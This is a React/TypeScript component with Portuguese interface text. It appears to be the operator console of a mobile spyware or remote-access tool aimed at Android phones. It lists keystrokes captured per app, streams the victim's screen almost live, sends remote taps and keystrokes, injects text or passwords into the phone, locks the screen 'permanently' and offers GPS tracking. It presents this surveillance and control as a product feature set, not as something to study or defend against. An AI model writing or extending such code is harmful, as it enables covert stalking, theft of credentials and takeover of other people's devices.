import { useState, useEffect, useRef } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Input } from "@/components/ui/input";
import { trpc } from "@/lib/trpc";

interface DeviceDetailsProps {
  deviceId: string;
  deviceName: string;
  onBack: () => void;
}

export default function DeviceDetails({
  deviceId,
  deviceName,
  onBack,
}: DeviceDetailsProps) {
  const [activeTab, setActiveTab] = useState("info");
  const [isLiveActive, setIsLiveActive] = useState(true);
  // Delay mínimo do ao vivo (1s)
  const MIN_LIVE_DELAY = 1000;
  const [isControlActive, setIsControlActive] = useState(false);
  const [isScreenLocked, setIsScreenLocked] = useState(false);
  const [selectedKeylogs, setSelectedKeylogs] = useState<Set<number>>(new Set());
  const [injectText, setInjectText] = useState("");
  const liveViewRef = useRef<HTMLDivElement>(null);

  // Fetch keylogs from backend
  const { data: keylogs = [], isLoading: keylogsLoading, refetch: refetchKeylogs } = trpc.keylogs.list.useQuery(
    { deviceId },
    { refetchInterval: 2000 } // Atualizar a cada 2 segundos
  );

  // Fetch deleted keylogs from backend
  const { data: deletedKeylogs = [], refetch: refetchDeleted } = trpc.keylogs.deleted.useQuery(
    { deviceId }
  );

  // Mutations
  const deleteKeylogMutation = trpc.keylogs.delete.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
      setSelectedKeylogs(new Set());
    },
  });

  const restoreKeylogMutation = trpc.keylogs.restore.useMutation({
    onSuccess: () => {
      refetchKeylogs();
      refetchDeleted();
    },
  });

  const removeDeviceMutation = trpc.device.remove.useMutation({
    onSuccess: () => {
      onBack();
    },
  });

  const sendTapMutation = trpc.device.sendTap.useMutation();
  const sendTextMutation = trpc.device.sendText.useMutation({
    onSuccess: () => setInjectText(""),
  });

  const lockMutation = trpc.screenLock.lock.useMutation({
    onSuccess: () => {
      setIsScreenLocked(true);
    },
  });

  const unlockMutation = trpc.screenLock.unlock.useMutation({
    onSuccess: () => {
      setIsScreenLocked(false);
    },
  });

  const startSimulatorMutation = trpc.keylogs.startSimulator.useMutation({
    onSuccess: () => {
      alert("⌨️ Simulador de keylogs iniciado!");
      refetchKeylogs();
    },
  });

  // Latest screenshot for live view — atualiza a cada 1.5s para ficar próximo ao tempo real
  const { data: latestScreenshot, refetch: refetchScreenshot } = trpc.device.latestScreenshot.useQuery(
    { deviceId: Number(deviceId) },
    { refetchInterval: isLiveActive ? MIN_LIVE_DELAY : false, enabled: isLiveActive }
  );

  // All screenshots for the screenshots tab
  const { data: allScreenshots = [] } = trpc.device.screenshots.useQuery(
    { deviceId: Number(deviceId), limit: 20 },
    { refetchInterval: 8000 }
  );

  // Captura teclado do painel e envia para o celular quando controle está ativo
  useEffect(() => {
    if (!isControlActive) return;

    const handleKeyDown = (e: KeyboardEvent) => {
      // Ignora se o foco está em um input/textarea do painel
      const tag = (e.target as HTMLElement)?.tagName;
      if (tag === "INPUT" || tag === "TEXTAREA") return;

      e.preventDefault();

      let value = "";
      if (e.key === "Enter") value = "\n";
      else if (e.key === "Backspace") value = "\b";
      else if (e.key === "Tab") value = "\t";
      else if (e.key === " ") value = " ";
      else if (e.key.length === 1) value = e.key;
      else return; // teclas especiais (F1, Shift, etc.) ignoradas

      sendTextMutation.mutate({ deviceId: Number(deviceId), value });
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isControlActive, deviceId]);

  const handleScreenshot = () => {
    refetchScreenshot();
  };

  const handleStopLive = () => {
    setIsLiveActive(false);
    setIsControlActive(false);
  };

  const handleStartLive = () => {
    setIsLiveActive(true);
  };

  const handleActivateControl = () => {
    if (!isLiveActive) setIsLiveActive(true);
    setIsControlActive(!isControlActive);
  };

  const handleLiveViewClick = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!isControlActive) return;
    const rect = e.currentTarget.getBoundingClientRect();
    const xPercent = ((e.clientX - rect.left) / rect.width) * 100;
    const yPercent = ((e.clientY - rect.top) / rect.height) * 100;
    sendTapMutation.mutate({ deviceId: Number(deviceId), xPercent, yPercent });
  };

  const handleLockScreen = () => {
    // Envia comando de bloqueio para o CELULAR — não trava o painel
    lockMutation.mutate({ deviceId: Number(deviceId) });
  };

  const handleUnlockScreen = () => {
    unlockMutation.mutate({ deviceId: Number(deviceId) });
  };

  const handleRemoveDevice = () => {
    if (confirm(`Tem certeza que deseja remover ${deviceName}?`)) {
      removeDeviceMutation.mutate({ deviceId: Number(deviceId) });
    }
  };

  const handleToggleKeylogSelection = (id: number) => {
    const newSelected = new Set(selectedKeylogs);
    if (newSelected.has(id)) {
      newSelected.delete(id);
    } else {
      newSelected.add(id);
    }
    setSelectedKeylogs(newSelected);
  };

  const handleRemoveSelectedKeylogs = () => {
    if (selectedKeylogs.size === 0) {
      alert("Selecione pelo menos um keylog para remover");
      return;
    }
    selectedKeylogs.forEach((id) => {
      deleteKeylogMutation.mutate({ keylogId: id });
    });
  };

  const handleRemoveAllKeylogs = () => {
    if (confirm("Tem certeza que deseja remover TODOS os keylogs?")) {
      keylogs.forEach((keylog) => {
        deleteKeylogMutation.mutate({ keylogId: keylog.id });
      });
    }
  };

  const handleRestoreKeylog = (id: number) => {
    restoreKeylogMutation.mutate({ keylogId: id });
  };

  // Função para remover screenshot
  const removeScreenshotMutation = trpc.device.removeScreenshot.useMutation({
    onSuccess: () => {
      // Atualiza lista após remoção
      refetchScreenshot();
    },
  });

  const handleRemoveScreenshot = (screenshotId: number) => {
    if (confirm("Remover este screenshot?")) {
      removeScreenshotMutation.mutate({ id: screenshotId });
    }
  };

  // Format timestamp to readable time
  const formatTime = (date: Date | string) => {
    const d = new Date(date);
    return d.toLocaleTimeString("pt-BR");
  };

  return (
    <div className="space-y-6 pb-8">
      {/* Header */}
      <div className="flex items-center justify-between">
        <Button
          onClick={onBack}
          variant="outline"
          className="text-cyan-400 border-cyan-600 hover:bg-cyan-900"
        >
          ← Voltar
        </Button>
        <h1 className="text-3xl font-bold text-cyan-400">
          {deviceName}
        </h1>
      </div>

      {/* Action Buttons */}
      <div className="flex flex-wrap gap-3">
        <Button
          onClick={handleScreenshot}
          className="bg-cyan-500 hover:bg-cyan-600 text-white"
        >
          📸 Capturar Screenshot
        </Button>
        {isLiveActive ? (
          <Button
            onClick={handleStopLive}
            className="bg-red-600 hover:bg-red-700 text-white"
          >
            ⏹️ Parar Ao Vivo
          </Button>
        ) : (
          <Button
            onClick={handleStartLive}
            className="bg-green-600 hover:bg-green-700 text-white"
          >
            ▶️ Ativar Ao Vivo
          </Button>
        )}
        <Button
          onClick={handleActivateControl}
          className={`text-white ${isControlActive ? "bg-green-700 hover:bg-green-800 ring-2 ring-green-400" : "bg-blue-600 hover:bg-blue-700"}`}
        >
          🎮 {isControlActive ? "Controle Ativo" : "Ativar Controle"}
        </Button>
        <Button
          onClick={handleLockScreen}
          disabled={lockMutation.isPending}
          className={`text-white ${isScreenLocked ? "bg-orange-800 hover:bg-orange-900" : "bg-orange-600 hover:bg-orange-700"}`}
        >
          🚫 {isScreenLocked ? "Tela Travada ✓" : "Travar Tela"}
        </Button>
        {isScreenLocked && (
          <Button
            onClick={handleUnlockScreen}
            disabled={unlockMutation.isPending}
            className="bg-green-600 hover:bg-green-700 text-white"
          >
            🔓 Destravar Tela
          </Button>
        )}
        <Button
          onClick={handleRemoveDevice}
          className="bg-red-700 hover:bg-red-800 text-white"
        >
          🗑️ Remover Dispositivo
        </Button>
      </div>

      {/* Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
        <TabsList className="grid w-full grid-cols-5 bg-slate-900 border border-slate-700">
          <TabsTrigger value="info" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">ℹ️ Informações</TabsTrigger>
          <TabsTrigger value="commands" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">⚙️ Comandos</TabsTrigger>
          <TabsTrigger value="screenshots" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">📸 Screenshots</TabsTrigger>
          <TabsTrigger value="keylogs" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">⌨️ Keylogs</TabsTrigger>
          <TabsTrigger value="history" className="data-[state=active]:bg-cyan-600 data-[state=active]:text-white">📜 Histórico</TabsTrigger>
        </TabsList>

        {/* Aba: Informações */}
        <TabsContent value="info" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📋 Informações Básicas</h3>
              <div className="space-y-3 text-slate-300">
                <div><p className="text-slate-400 text-sm">Nome do Dispositivo</p><p className="font-semibold">{deviceName}</p></div>
                <div><p className="text-slate-400 text-sm">Modelo</p><p className="font-semibold">Samsung Galaxy A12</p></div>
                <div><p className="text-slate-400 text-sm">Sistema Operacional</p><p className="font-semibold">Android 11</p></div>
                <div><p className="text-slate-400 text-sm">Versão</p><p className="font-semibold">11.0.1</p></div>
                <div><p className="text-slate-400 text-sm">Localização</p><p className="font-semibold">São Paulo, SP</p></div>
              </div>
            </Card>
            <Card className="bg-slate-800 border-slate-700 p-6">
              <h3 className="text-cyan-400 font-bold mb-4">📊 Status do Sistema</h3>
              <div className="space-y-3">
                <div>
                  <div className="flex justify-between mb-1"><p className="text-slate-400 text-sm">Bateria</p><p className="text-cyan-400 font-semibold">85%</p></div>
                  <div className="w-full bg-slate-700 rounded-full h-2"><div className="bg-green-500 h-2 rounded-full" style={{ width: "85%" }}></div></div>
                </div>
                <div>
                  <div className="flex justify-between mb-1"><p className="text-slate-400 text-sm">Memória</p><p className="text-cyan-400 font-semibold">4.2 GB / 8 GB</p></div>
                  <div className="w-full bg-slate-700 rounded-full h-2"><div className="bg-blue-500 h-2 rounded-full" style={{ width: "52.5%" }}></div></div>
                </div>
                <div><p className="text-slate-400 text-sm">Sinal</p><p className="text-cyan-400 font-semibold">📶 Excelente</p></div>
                <div><p className="text-slate-400 text-sm">Temperatura</p><p className="text-cyan-400 font-semibold">36°C</p></div>
                <div><p className="text-slate-400 text-sm">Último Acesso</p><p className="text-cyan-400 font-semibold">Agora</p></div>
              </div>
            </Card>
          </div>
        </TabsContent>

        {/* Aba: Comandos */}
        <TabsContent value="commands" className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {([
              { icon: "📸", title: "Tirar Screenshot", desc: "Capturar tela do dispositivo" },
              { icon: "🔊", title: "Ativar Som", desc: "Reproduzir som no dispositivo" },
              { icon: "🔒", title: "Bloquear Dispositivo", desc: "Bloquear a tela do dispositivo" },
              { icon: "🚫", title: "Travar Tela", desc: "Travar a tela permanentemente" },
              { icon: "📍", title: "Rastrear Localização", desc: "Obter localização GPS em tempo real" },
              { icon: "🔄", title: "Sincronizar", desc: "Sincronizar dados do dispositivo" },
            ]).map((cmd, idx) => (
              <Card key={idx} className="bg-slate-800 border-slate-700 p-4 hover:border-cyan-500 transition">
                <div className="flex items-start justify-between">
                  <div>
                    <p className="text-2xl mb-2">{cmd.icon}</p>
                    <h4 className="text-cyan-400 font-bold">{cmd.title}</h4>
                    <p className="text-slate-400 text-sm mt-1">{cmd.desc}</p>
                  </div>
                </div>
                <Button className="w-full mt-3 bg-cyan-600 hover:bg-cyan-700">Executar</Button>
              </Card>
            ))}
          </div>
        </TabsContent>

        {/* Aba: Screenshots */}
        <TabsContent value="screenshots" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados ({allScreenshots.length})</h3>
            {allScreenshots.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum screenshot capturado ainda</p>
            ) : (
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                {allScreenshots.map((s) => (
                  <div key={s.id} className="rounded-lg overflow-hidden border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
                    <img
                      src={s.screenshotUrl}
                      alt="Screenshot"
                      className="w-full object-contain bg-black"
                      style={{ maxHeight: "200px" }}
                      onClick={() => window.open(s.screenshotUrl, "_blank")}
                    />
                    <div className="flex items-center justify-between bg-slate-700 px-2 py-1">
                      <p className="text-slate-500 text-xs">
                        {new Date(s.createdAt).toLocaleTimeString("pt-BR")}
                      </p>
                      <Button
                        size="sm"
                        variant="destructive"
                        className="text-xs px-2 py-1"
                        onClick={() => handleRemoveScreenshot(s.id)}
                      >Remover</Button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>

        </TabsContent>

        {/* Aba: Keylogs */}
        <TabsContent value="keylogs" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-cyan-400 font-bold">⌨️ Keylogs Capturados ({keylogs.length})</h3>
              <div className="flex gap-2">
                <Button
                  onClick={handleRemoveSelectedKeylogs}
                  disabled={selectedKeylogs.size === 0}
                  className="bg-red-600 hover:bg-red-700 text-white disabled:opacity-50"
                >
                  🗑️ Remover Selecionados ({selectedKeylogs.size})
                </Button>
                <Button onClick={handleRemoveAllKeylogs} className="bg-red-700 hover:bg-red-800 text-white">
                  ⚠️ Remover Todos
                </Button>
              </div>
            </div>
            {keylogsLoading ? (
              <p className="text-slate-400 text-center py-8">Carregando keylogs...</p>
            ) : keylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog capturado</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {keylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex items-center gap-3 p-3 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                  >
                    <input
                      type="checkbox"
                      checked={selectedKeylogs.has(log.id)}
                      onChange={() => handleToggleKeylogSelection(log.id)}
                      className="w-4 h-4 cursor-pointer"
                    />
                    <div className="flex-1">
                      <p className="text-slate-300">
                        <span className="text-cyan-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>

        {/* Aba: Histórico */}
        <TabsContent value="history" className="space-y-4">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <h3 className="text-cyan-400 font-bold mb-4">📜 Histórico de Keylogs Removidos ({deletedKeylogs.length})</h3>
            {deletedKeylogs.length === 0 ? (
              <p className="text-slate-400 text-center py-8">Nenhum keylog no histórico</p>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {deletedKeylogs.map((log) => (
                  <div
                    key={log.id}
                    className="flex justify-between items-center p-3 bg-slate-700 rounded border border-slate-600 hover:border-yellow-500 transition"
                  >
                    <div>
                      <p className="text-slate-300">
                        <span className="text-yellow-400">{log.appName}</span>: {log.keyText}
                      </p>
                      <p className="text-slate-500 text-xs">{formatTime(log.createdAt)}</p>
                    </div>
                    <Button
                      onClick={() => handleRestoreKeylog(log.id)}
                      className="bg-green-600 hover:bg-green-700 text-white text-sm"
                    >
                      ↩️ Restaurar
                    </Button>
                  </div>
                ))}
              </div>
            )}
          </Card>
        </TabsContent>
      </Tabs>

      {/* Visualização ao Vivo */}
      {isLiveActive && (
        <div className="mt-8">
          <Card className="bg-slate-800 border-slate-700 p-6">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-cyan-400 font-bold">
                🔴 Visualização Ao Vivo
                {isControlActive && (
                  <span className="ml-2 text-xs text-green-400 font-normal animate-pulse">
                    ● Controle Ativo — clique na tela ou digite pelo teclado
                  </span>
                )}
                {!isControlActive && (
                  <span className="ml-2 text-xs text-slate-400 font-normal">atualiza a cada 1.5s</span>
                )}
              </h3>
              <Button
                onClick={() => refetchScreenshot()}
                className="bg-cyan-700 hover:bg-cyan-600 text-white text-sm"
              >
                🔄 Atualizar
              </Button>
            </div>
            <div className="flex justify-center">
              {latestScreenshot?.screenshotUrl ? (
                <div className="relative" style={{ width: "360px" }}>
                  {/* Moldura do celular */}
                  <div className="bg-gradient-to-b from-slate-900 to-slate-800 rounded-3xl border-8 border-slate-900 p-2 shadow-2xl">
                    <div className="h-5 bg-black rounded-b-3xl mx-auto w-32 mb-1"></div>
                    <div
                      ref={liveViewRef}
                      className={`rounded-2xl overflow-hidden bg-black relative select-none ${isControlActive ? "cursor-pointer" : ""}`}
                      onClick={handleLiveViewClick}
                    >
                      <img
                        src={latestScreenshot.screenshotUrl}
                        alt="Screenshot ao vivo"
                        className="w-full object-contain"
                        style={{ maxHeight: "640px", pointerEvents: "none" }}
                        draggable={false}
                      />
                      {isControlActive && (
                        <div className="absolute inset-0 border-2 border-green-400 rounded-2xl pointer-events-none" />
                      )}
                    </div>
                    <div className="h-6 flex items-center justify-center mt-1">
                      <div className="w-16 h-1 bg-slate-700 rounded-full"></div>
                    </div>
                  </div>
                  <p className="text-center text-slate-500 text-xs mt-2">
                    Capturado: {new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}
                  </p>
                  {isControlActive && (
                    <p className="text-center text-green-400 text-xs mt-1">
                      🎮 Clique para tocar • Digite no teclado para digitar no celular
                    </p>
                  )}
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center py-16 text-slate-400">
                  <div className="text-5xl mb-4">📱</div>
                  <p className="text-sm">Aguardando screenshot do dispositivo...</p>
                  <p className="text-xs text-slate-500 mt-1">O celular enviará capturas automaticamente</p>
                </div>
              )}
            </div>
          </Card>
        </div>
      )}

      {/* Injeção de Texto / Senha */}
      {isControlActive && (
        <div className="mt-4">
          <Card className="bg-slate-800 border-green-700 p-5">
            <h3 className="text-green-400 font-bold mb-3">💉 Injeção de Texto / Senha</h3>
            <p className="text-slate-400 text-xs mb-3">
              Digite um texto ou senha e clique em Injetar — será preenchido no campo ativo do celular.
              Você também pode digitar diretamente pelo teclado enquanto o controle está ativo.
            </p>
            <div className="flex gap-2">
              <Input
                type="text"
                placeholder="Ex: senha123 ou qualquer texto..."
                value={injectText}
                onChange={(e) => setInjectText(e.target.value)}
                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder-slate-400"
                onKeyDown={(e) => {
                  if (e.key === "Enter" && injectText.trim()) {
                    e.stopPropagation();
                    sendTextMutation.mutate({ deviceId: Number(deviceId), value: injectText });
                  }
                }}
              />
              <Button
                onClick={() => {
                  if (injectText.trim()) {
                    sendTextMutation.mutate({ deviceId: Number(deviceId), value: injectText });
                  }
                }}
                disabled={!injectText.trim() || sendTextMutation.isPending}
                className="bg-green-600 hover:bg-green-700 text-white"
              >
                💉 Injetar
              </Button>
              <Button
                onClick={() => sendTextMutation.mutate({ deviceId: Number(deviceId), value: "\n" })}
                className="bg-slate-600 hover:bg-slate-500 text-white"
                title="Enviar Enter"
              >
                ↵
              </Button>
            </div>
            <div className="flex gap-2 mt-2 flex-wrap">
              {["Backspace", "Tab", "Enter"].map((key) => (
                <Button
                  key={key}
                  onClick={() => sendTextMutation.mutate({ deviceId: Number(deviceId), value: key === "Backspace" ? "\b" : key === "Tab" ? "\t" : "\n" })}
                  className="bg-slate-700 hover:bg-slate-600 text-white text-xs px-3"
                >
                  {key}
                </Button>
              ))}
            </div>
          </Card>
        </div>
      )}
    </div>
  );
}
